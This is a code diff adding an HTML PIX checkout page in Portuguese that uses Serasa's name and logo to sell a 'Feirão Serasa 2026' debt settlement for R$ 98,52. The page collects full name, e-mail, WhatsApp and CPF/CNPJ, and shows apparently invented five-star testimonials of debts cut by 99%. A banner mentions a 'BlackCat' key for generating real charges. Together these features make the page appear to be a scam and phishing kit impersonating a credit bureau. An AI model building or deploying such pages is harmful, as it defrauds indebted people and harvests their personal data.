@@ -1,0 +1,248 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#fffaf7" />
+    <meta name="description" content="Checkout seguro via PIX para o Curso Digital." />
+    <title>Checkout | Feirão Serasa</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@500;600;700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="/styles.css?v=12" />
+  </head>
+  <body>
+    <a class="skip-link" href="#checkout-form">Ir para o formulario</a>
+
+    <div class="site-shell">
+      <header class="topbar" aria-label="Cabecalho do checkout">
+        <a class="brand" href="/" aria-label="Serasa - inicio">
+          <img class="brand-logo" src="/assets/serasa-logo-top.png" alt="Serasa" />
+        </a>
+
+        <div class="secure-label">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7.5 10V7.5a4.5 4.5 0 0 1 9 0V10m-10 0h11a2 2 0 0 1 2 2v7h-15v-7a2 2 0 0 1 2-2Z" /></svg>
+          Ambiente seguro
+        </div>
+      </header>
+
+      <main class="checkout-layout">
+        <section class="checkout-content" aria-labelledby="page-title">
+          <div class="step-heading reveal">
+
+          <div id="demo-banner" class="demo-banner reveal" hidden>
+            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 8v4m0 4h.01M10.3 3.7 2.9 17a2 2 0 0 0 1.75 3h14.7a2 2 0 0 0 1.75-3L13.7 3.7a2 2 0 0 0-3.4 0Z" /></svg>
+            <div><strong>Modo de demonstracao</strong><span>Insira a chave BlackCat no servidor para gerar cobrancas reais.</span></div>
+          </div>
+
+          <form id="checkout-form" class="form-card reveal" novalidate>
+            <div class="section-title">
+              <span class="section-number">01</span>
+              <div>
+                <h2>Seus dados</h2>
+                <p>Usaremos estas informacoes somente para concluir a compra.</p>
+              </div>
+            </div>
+
+            <div id="form-alert" class="form-alert" role="alert" hidden></div>
+
+            <div class="form-grid">
+              <div class="field field-full">
+                <label for="name">Nome completo</label>
+                <div class="input-wrap">
+                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 21v-2a4 4 0 0 0-4-4H7a4 4 0 0 0-4 4v2m6.5-10A4 4 0 1 0 9.5 3a4 4 0 0 0 0 8Z" /></svg>
+                  <input id="name" name="name" type="text" autocomplete="name" placeholder="Seu nome e sobrenome" required minlength="5" />
+                </div>
+                <span class="field-error" data-error-for="name"></span>
+              </div>
+
+              <div class="field">
+                <label for="email">E-mail</label>
+                <div class="input-wrap">
+                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="m3 6 9 6 9-6M5 4h14a2 2 0 0 1 2 2v12H3V6a2 2 0 0 1 2-2Z" /></svg>
+                  <input id="email" name="email" type="email" autocomplete="email" inputmode="email" placeholder="voce@email.com" required />
+                </div>
+                <span class="field-error" data-error-for="email"></span>
+              </div>
+
+              <div class="field">
+                <label for="phone">WhatsApp</label>
+                <div class="input-wrap">
+                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 3h10v18H7V3Zm4 15h2" /></svg>
+                  <input id="phone" name="phone" type="tel" autocomplete="tel" inputmode="numeric" placeholder="(11) 99999-9999" required />
+                </div>
+                <span class="field-error" data-error-for="phone"></span>
+              </div>
+
+              <div class="field field-full">
+                <label for="document">CPF ou CNPJ</label>
+                <div class="input-wrap">
+                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 3h14v18H5V3Zm3 5h8M8 12h8M8 16h5" /></svg>
+                  <input id="document" name="document" type="text" autocomplete="off" inputmode="numeric" placeholder="000.000.000-00" required />
+                </div>
+                <span class="field-helper">Necessario para emitir a cobranca PIX.</span>
+                <span class="field-error" data-error-for="document"></span>
+              </div>
+            </div>
+
+            <div class="payment-section">
+              <div class="section-title compact">
+                <span class="section-number">02</span>
+                <div>
+                  <h2>Pagamento</h2>
+                  <p>Uma unica opcao, simples e sem taxas extras.</p>
+                </div>
+              </div>
+
+              <div class="payment-option" aria-label="PIX selecionado">
+                <span class="pix-icon" aria-hidden="true">
+                  <img src="/assets/pix-icon.png" alt="" width="38" height="38" />
+                </span>
+                <span class="payment-copy"><strong>PIX</strong><small>Aprovacao em poucos segundos</small></span>
+                <span class="best-option">Mais rapido</span>
+                <span class="selected-radio"><span></span></span>
+              </div>
+            </div>
+
+            <button id="submit-button" class="primary-button" type="submit">
+              <span class="button-label">Gerar PIX</span>
+              <span class="button-spinner" aria-hidden="true"></span>
+              <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14m-5-5 5 5-5 5" /></svg>
+            </button>
+
+            <div class="trust-row" aria-label="Garantias da compra">
+              <span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3 4 6v5c0 5 3.4 8.6 8 10 4.6-1.4 8-5 8-10V6l-8-3Zm-3 9 2 2 4-5" /></svg>Compra protegida</span>
+              <span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 12a8 8 0 1 0 2.3-5.7L4 8.5M4 4v4.5h4.5" /></svg>7 dias de garantia</span>
+            </div>
+          </form>
+
+          <section id="pix-result" class="pix-result reveal" aria-live="polite" hidden>
+            <div class="success-mark" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="m5 12 4 4L19 6" /></svg></div>
+            <span class="eyebrow">PIX gerado com sucesso</span>
+            <h2>Agora e so pagar.</h2>
+            <p>Abra o app do seu banco, escaneie o QR Code ou use o codigo copia e cola.</p>
+
+            <div class="pix-box">
+              <div class="qr-frame">
+                <img id="qr-code" alt="QR Code PIX da compra" width="220" height="220" />
+                <span class="qr-logo" aria-hidden="true"><img src="/assets/pix-icon.png" alt="" width="24" height="24" /></span>
+              </div>
+              <div id="demo-qr-note" class="demo-qr-note" hidden>QR ilustrativo para demonstracao</div>
+            </div>
+
+            <div class="copy-section">
+              <label for="pix-code">PIX copia e cola</label>
+              <div class="copy-control">
+                <input id="pix-code" type="text" readonly />
+                <button id="copy-button" type="button" aria-label="Copiar codigo PIX">
+                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M8 8h11v13H8V8Zm-3 8H3V3h11v2" /></svg>
+                  <span>Copiar</span>
+                </button>
+              </div>
+            </div>
+
+            <div class="pix-status">
+              <span class="status-pulse" aria-hidden="true"></span>
+              <div><strong id="status-title">Aguardando pagamento</strong><small id="status-subtitle">A pagina atualiza automaticamente.</small></div>
+              <span id="pix-timer">30:00</span>
+            </div>
+
+            <button id="new-payment-button" class="text-button" type="button">Voltar e corrigir meus dados</button>
+          </section>
+        </section>
+
+        <aside class="order-card reveal" aria-labelledby="summary-title">
+          <div class="order-card-head">
+            <span class="eyebrow">Seu pedido</span>
+            <h2 id="summary-title">Resumo da compra</h2>
+          </div>
+
+          <div class="product-row">
+            <div class="product-art">
+              <img src="/assets/serasa-product.png" alt="Imagem do produto Feirao Serasa" />
+            </div>
+            <div class="product-info">
+              <span class="access-badge">Liberação imediata</span>
+              <strong id="product-name">Feirão Serasa 2026</strong>
+              <small>Feirão Serasa</small>
+            </div>
+          </div>
+
+          <div class="summary-lines">
+            <div><span>Valor do acordo</span><strong id="subtotal-price">R$ 98,52</strong></div>
+            <div><span>Taxa de pagamento</span><strong class="free-label">Gratis</strong></div>
+          </div>
+
+          <div class="summary-total">
+            <div><span>Total</span><small>Pagamento unico via PIX</small></div>
+            <strong id="total-price">R$ 98,52</strong>
+          </div>
+
+          <div class="checkout-security">
+            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7.5 10V7.5a4.5 4.5 0 0 1 9 0V10m-10 0h11a2 2 0 0 1 2 2v7h-15v-7a2 2 0 0 1 2-2Z" /></svg>
+            <span><strong>Pagamento 100% seguro</strong><small>Seus dados sao criptografados.</small></span>
+          </div>
+        </aside>
+      </main>
+
+      <section class="reviews-section reveal" aria-labelledby="reviews-title">
+        <div class="reviews-heading">
+          <span class="eyebrow">Experiencia de quem já Negociou</span>
+          <h2 id="reviews-title">Quem negocia, recomenda.</h2>
+          <p>Veja como quem negociou descrevem a experiencia com o Serasa.</p>
+        </div>
+
+        <div class="reviews-grid">
+          <article class="review-card">
+            <div class="review-stars" role="img" aria-label="5 de 5 estrelas">
+              <svg viewBox="0 0 100 20" aria-hidden="true"><path d="m10 1.8 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L10 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L30 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L50 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L70 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L90 1.8Z" /></svg>
+            </div>
+            <blockquote>"Minha dívida estava em torno de R$ 25 mil. Com 99% de desconto, quitei tudo por apenas R$ 98. Agora posso ser um cidadão com o nome limpo e isso é gratificante!"</blockquote>
+            <footer class="review-author">
+              <span class="review-avatar">
+                <img src="/assets/review-mariana.webp" alt="Foto de Mariana S." />
+              </span>
+              <span><strong>Mariana S.</strong><small><svg viewBox="0 0 16 16" aria-hidden="true"><path d="m3 8 3 3 7-7" /></svg>Dívida quitada</small></span>
+            </footer>
+          </article>
+
+          <article class="review-card">
+            <div class="review-stars" role="img" aria-label="5 de 5 estrelas">
+              <svg viewBox="0 0 100 20" aria-hidden="true"><path d="m10 1.8 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L10 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L30 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L50 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L70 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L90 1.8Z" /></svg>
+            </div>
+            <blockquote>"Recebi 99% de desconto - foi um descontão! Agora posso dormir em paz, me sinto mais leve e vou poder comprar o que preciso, sem fazer novas dívidas."</blockquote>
+            <footer class="review-author">
+              <span class="review-avatar">
+                <img src="/assets/review-lucas.webp" alt="Foto de Lucas R." />
+              </span>
+              <span><strong>Lucas R.</strong><small><svg viewBox="0 0 16 16" aria-hidden="true"><path d="m3 8 3 3 7-7" /></svg>Dívida quitada</small></span>
+            </footer>
+          </article>
+
+          <article class="review-card">
+            <div class="review-stars" role="img" aria-label="5 de 5 estrelas">
+              <svg viewBox="0 0 100 20" aria-hidden="true"><path d="m10 1.8 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L10 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L30 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L50 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L70 1.8Zm20 0 2.5 5.1 5.7.8-4.1 4 .9 5.6-5-2.6-5 2.6.9-5.6-4.1-4 5.7-.8L90 1.8Z" /></svg>
+            </div>
+            <blockquote>"Estou me sentindo feliz da vida! Carregava essa dívida há 8 anos, mas agora o caminho está livre. Vou seguir com sabedoria. Isso é ótimo"</blockquote>
+            <footer class="review-author">
+              <span class="review-avatar">
+                <img src="/assets/review-camila.webp" alt="Foto de Camila A." />
+              </span>
+              <span><strong>Camila A.</strong><small><svg viewBox="0 0 16 16" aria-hidden="true"><path d="m3 8 3 3 7-7" /></svg>Dívida quitada</small></span>
+            </footer>
+          </article>
+        </div>
+
+      </section>
+
+      <footer>
+        <span id="termos">Termos de compra</span>
+        <span id="privacidade">Privacidade</span>
+        <span>Suporte ao cliente</span>
+      </footer>
+    </div>
+
+    <div id="toast" class="toast" role="status" aria-live="polite"></div>
+    <script src="/app.js?v=12" defer></script>
+  </body>
+</html>
